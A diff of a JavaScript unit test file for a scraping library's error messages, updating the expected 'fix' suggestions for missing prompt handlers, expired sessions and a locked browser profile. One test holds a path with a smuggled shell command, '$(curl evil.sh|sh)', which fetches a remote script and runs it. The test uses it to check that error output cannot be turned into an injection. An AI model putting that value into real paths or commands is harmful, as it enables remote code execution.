@@ -170,9 +170,8 @@ describe('unit · the fix line is an executable command, per code', () => {
     expect(error.cause).toBe(
       'scrape "orders.daily" asked for "SMS code" and no prompt handler was declared',
     );
-    expect(error.fix).toContain(
-      'add prompt: async ({ label }) => await otpFor(label) to scrape("orders.daily")',
-    );
+    expect(error.fix).toStartWith('{ prompt: async ({ label }) => await otpFor(label) }');
+    expect(error.fix).toContain('scrape("orders.daily")');
     expect(error.meta).toEqual({ scrape: 'orders.daily', label: 'SMS code' });
   });
 });
@@ -190,7 +189,7 @@ describe('unit · the two budget/session failures', () => {
     expect(error.code).toBe('X_SCRAPE_SESSION_EXPIRED');
     expect(error.cause).toContain('the stored session org-1/orders.daily/default');
     expect(error.cause).toContain('declares no auth.login');
-    expect(error.fix).toContain('add auth: { login } to scrape("orders.daily")');
+    expect(error.fix).toStartWith('auth: { login }   // on scrape("orders.daily")');
     expect(error.meta).toEqual({ scrape: 'orders.daily', key: 'org-1/orders.daily/default' });
   });
 });
@@ -205,7 +204,7 @@ describe('unit · a profile directory a shell would read', () => {
     expect(error.fix).not.toContain('|');
     // No `rm` AT ALL: `rm -f <the profile directory …>` is a shell redirection, not a command.
     expect(error.fix).not.toContain('rm ');
-    expect(error.fix).toStartWith('delete the SingletonLock file inside the profile directory');
+    expect(error.fix).toStartWith("localBrowser({ profileDir: '<a directory of its own>' })");
     expect(error.cause).toContain('/var/scrape/$(curl evil.sh|sh)');
   });
 
